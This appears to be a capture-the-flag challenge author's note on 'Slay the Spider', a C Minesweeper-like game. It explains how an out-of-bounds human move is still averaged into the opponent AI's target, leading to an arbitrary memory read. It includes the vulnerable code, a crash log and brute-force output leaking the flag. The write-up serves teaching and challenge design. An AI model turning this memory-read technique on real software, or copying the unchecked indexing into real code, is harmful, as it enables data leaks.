Slay the Spider is a Minesweeper-like game where the user and computer try to uncover a spider. The challenge name and trappings are based on [Slay the Spire](https://store.steampowered.com/app/646570/Slay_the_Spire/), which is one of my favourite games.

When you start the game, there are several different enemy AI options:

```
1: The Angry One - Plays at Random
2: Cheater Mc Cheaterly - Knows the best places to play
3: Smartypants - Uses magical super AI for the best chance of winning
4: Captain Fastidious - Is sure that playing left to right is best
```

Those are loosely based on the classes from Slay the Spire.

The third - *Smarypants* - is the key. It chooses the target square based on a silly algorithm:

```c
case AI_SMART:
  // Picks the average of the human move and the last computer move
  move.row = (human_move.row + last_computer_move.row) / 2;
  move.col = (human_move.col + last_computer_move.col) / 2;
```

The problem is that the `human_move.row` and `human_move.col` are set even when the move is invalid:

```c
static move_t do_human_turn(game_t *game) {
  move_t move;

  printf("It's your (human) move!\n");
  printf("\n");
  printf("Row?\n");
  move.row = read_int();

  printf("\n");
  printf("Col?\n");
  move.col = read_int();

  if(move.row > game->gameboard->rows || move.col > game->gameboard->cols || move.row < 0 || move.col < 0) {
    printf("Select a cell that's in-bounds next time!\n");
    printf("\n");
    printf("Result: one missed turn\n");
  }

  // [...]

  return move;
}

// [...]

move_t human_move = do_human_turn(game);
// [...]
```

As a result, you can choose an illegal space:

```
It's your (human) move!

Row?
100000

Col?
100000
Select a cell that's in-bounds next time!

Result: one missed turn
```

But the computer will still use that:

```
It's the opponent (Smartypants) move!
COMPUTER chooses [50001, 50001] and... fish: Job 1, './slay-the-spider' terminated by signal SIGSEGV (Address boundary error)
```

You can use that to read memory "before" the gameboard. So far I've just bruteforced the offset - I might need to add a leak which includes the flag. I'm hoping it'll be possible to reliably find the flag in memory, but I can do it against localhost pretty quickly:

```
Trying to read flag from offset -5184...
Connecting to localhost:4444...
String so far: C / ["43"]
String so far: CT / ["4354"]
String so far: CTF / ["435446"]
String so far: CTF{ / ["4354467b"]
String so far: CTF{t / ["4354467b74"]
```
